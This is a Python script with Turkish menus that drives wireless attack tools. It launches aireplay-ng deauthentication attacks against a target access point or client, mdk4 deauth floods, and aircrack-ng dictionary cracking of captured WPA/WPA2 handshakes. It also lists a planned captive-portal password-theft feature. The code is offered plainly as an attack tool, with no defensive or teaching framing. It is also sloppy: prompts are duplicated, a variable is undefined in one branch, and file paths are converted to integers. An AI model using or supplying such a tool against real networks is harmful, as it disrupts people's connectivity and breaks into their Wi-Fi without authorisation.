import subprocess
import os
import sys
import time
#import web

anamenü = int(input("1.ağ saldırısı\n2.subprocess install\n3.--help\n4.netdiscoveri kullan\n5.ET3'Ü DEVREYE SOK (root gerektirir)\nlütfen işleminizi seçiniz: "))

if anamenü == 1:
    işlem = input("Lütfen saldırılacak ağın MAC adresini giriniz: ")
    işlem2 = input("Lütfen saldırılacak cihazın MAC adresini giriniz\n! bütün ağa saldırı yapmak istiyorsanız (no) yazınız ")
    işlem3 = input("Lütfen saldırı seçiniz:\n1. deauth\n2. dakeauth\n3. amok mdk4 ddos: ")
    işlem4 = input("Lütfen deauth saldırısının zamanını belirleyiniz (<1 = >100000): ")
    işlem2 = input("Lütfen saldırılacak cihazın MAC adresini giriniz\n! bütün ağa saldırı yapmak istiyorsanız (no) yazınız ")
    if işlem2 == "no":
            subprocess.call(["sudo", "aireplay-ng", "--deauth", işlem4, "-a", işlem, "wlan0mon"])
    else:
        subprocess.call(["sudo", "aireplay-ng", "--deauth", işlem4, "-a", işlem, "-c", işlem2, "wlan0mon"])
if anamenü == 2:
    try:
        import subprocess
    except ImportError:
        print("subprocess modülü yüklü değil!")
        os.system("pip install subprocess")
    else:
        print("subprocess modülü yüklü!")
        

##if anamenü == "4":
   # işlem5 = input("hangi ağ arayüzünü kulllanmak istiyorsanız lütfen onu yazınız (örn eth0)")
    #subprocess.call(["sudo", "netdiscover", "-i" ,işlem5])

#if anamenü == "3":
   # print("ekrana yazılan komutlar (sudo", "aireplay-ng", "--deauth","wlan0mon\nyüklü olması gerekilen modüller subprocess nasıl yüklenir ?" ("sudo pip install subprocess"))

if anamenü == 5:
    print("          ░░░░░░░          ")
    print("     ░░░░░░░░░░░░░░░░░     ")
    print("   │░░░░░░░░░░░░░░░░░░░│   ")
    print("   │░░░░░░░░░░░░░░░░░░░│   ")
    print("  ░└┐░░░░░░░░░░░░░░░░░┌┘░  ")
    print("  ░░└┐░░░░░░░░░░░░░░░┌┘░░  ")
    print("  ░░┌┘      ░░░░░    └┐░░  ")
    print("  ░ │   E    ░░░   T  │░   ")
    print("   ░│       ░░▄░░     │░   ")
    print("   ─┘░░░░░░░333░░░░░░░└─   ")
    print("   ░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░   ")
    print("     ─┘██▌░░░░░░░▐██└─     ")
    print("     ░░▐█─┬┬┬┬┬┬┬─█▌░░     ")
    print("     ░░░▀┬┼┼┼┼┼┼┼┬▀░░░     ")
    print("      ░░░└┴┴┴┴┴┴┴┘░░░      ")
    print("        ░░░░░░░░░░░        ")
   # subprocess.call(["sudo", "su"])
    işlem666 = int(input("1.kaba kuvvet becon flood(dos/ddos/)\n2..şifre çalma (esaret portalı)(henüz eklenmedi)\n3.mdk4 kaba kuvvet(deauth)\n4.bulunmuş handshakeye kaba kuvvet\n6.kritik hasar ağ iptali(ağır saldırı)\nlütfen yapmak istediğiniz işlemi saçiniz?:"))
    if işlem666 == 1:
        işlem667 = int(input("lütfen ağ cihazının mac adresini giriniz [bilmiyorsanız 2'ye basınız]:"))
        if işlem667 == 2:
           print("terminale şunları yazınız\nsudo airmon-ng wlan0(ağ kartı\nsudo airodump-ng wlan0mon)")
        else:
         işlem3 = input("Lütfen saldırı seçiniz:\n1. deauth\n2. dakeauth\n3. amok mdk4 ddos: ")
    işlem4 = input("Lütfen deauth saldırısının zamanını belirleyiniz (<1 = >100000): ")
    işlem2 = input("Lütfen saldırılacak cihazın MAC adresini giriniz\n! bütün ağa saldırı yapmak istiyorsanız (no) yazınız ")
    if işlem2 == "no":
            subprocess.call(["sudo", "aireplay-ng", "--deauth", işlem4, "-a", işlem, "wlan0mon"])
    else:
        subprocess.call(["sudo", "aireplay-ng", "--deauth", işlem4, "-a", işlem, "-c", işlem2, "wlan0mon"])
    #elif işlem666 == 2:
    if işlem666 == 3:
        channelnumber = int(input("lütfen ağınız kanal numarasını yazınız (bilmiyorsanız 2'ye basmanız yeterlidir)"))
        if channelnumber == 2:
                    print("sudo airodump-ng wlan0mon yazmanız yeterlidir\n(örnek: BSSID 5C:63:x:x9:xB:Exx   (((((CH 8)))))))")
        else:
           subprocess.call(["sudo","mdk4","wlan0mon","d","-c", channelnumber])
    elif işlem666 == 4:
        şifre =int(input("WPA/WPA2 Güvenlik Korumalarına şifre saldırısı\nlütfen sonu .txt olan şifre dosyanızın dizin yolunun yazınız:"))
        cap = int(input("lütfen .cap uzantılı wireshark kırılmamış dosyanın dizin yolunu yazınız:"))
        subprocess.call(["aircrack-ng", "-w", şifre, cap, ])
        